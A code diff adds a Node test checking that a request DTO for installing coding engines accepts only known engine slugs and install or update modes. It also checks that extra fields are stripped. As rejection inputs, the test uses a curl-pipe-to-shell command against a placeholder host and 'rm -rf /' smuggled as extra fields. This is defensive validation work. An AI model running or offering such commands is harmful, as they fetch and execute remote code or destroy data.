@@ -3,7 +3,7 @@ import { test } from 'node:test';
 import { plainToInstance } from 'class-transformer';
 import { validate } from 'class-validator';
 import { uuidToBase62 } from '@orbit/shared';
-import { ReorderRunnersDto, StartInstallDto, StartLoginDto } from './dto';
+import { ReorderRunnersDto, RequestEngineInstallDto, StartInstallDto, StartLoginDto } from './dto';
 
 test('Antigravity can be installed and signed into', async () => {
   const install = Object.assign(new StartInstallDto(), { engine: 'antigravity' });
@@ -30,6 +30,22 @@ test('StartInstallDto rejects an engine slug it does not know', async () => {
   const dto = new StartInstallDto();
   dto.engine = 'aider' as never;
   assert.notEqual((await validate(dto)).length, 0);
+});
+
+test('RequestEngineInstallDto takes an engine Install takes and install or update, and nothing else', async () => {
+  // As the global ValidationPipe builds and checks the body (main.ts: whitelist on).
+  const body = (plain: Record<string, unknown>) => plainToInstance(RequestEngineInstallDto, plain);
+  for (const engine of ['claude', 'codex', 'kimi', 'antigravity', 'opencode', 'dsh', 'cursor']) {
+    assert.deepEqual(await validate(body({ engine })), [], engine);
+    for (const mode of ['install', 'update']) assert.deepEqual(await validate(body({ engine, mode })), [], `${engine} ${mode}`);
+  }
+  for (const plain of [{}, { mode: 'update' }, { engine: 'aider' }, { engine: 'curl -fsSL https://example.test/x.sh | sh' }, { engine: 'claude', mode: 'reinstall' }]) {
+    assert.notEqual((await validate(body(plain))).length, 0, JSON.stringify(plain));
+  }
+  // A command, or anything else, is not a field: it is dropped before the route reads the body.
+  const smuggled = body({ engine: 'claude', command: 'curl -fsSL https://example.test/x.sh | sh', installCmd: 'rm -rf /' });
+  assert.deepEqual(await validate(smuggled, { whitelist: true }), []);
+  assert.deepEqual(Object.entries(smuggled).filter(([, value]) => value !== undefined), [['engine', 'claude']]);
 });
 
 test('StartLoginDto accepts every built-in login engine, including Kimi and Antigravity', async () => {
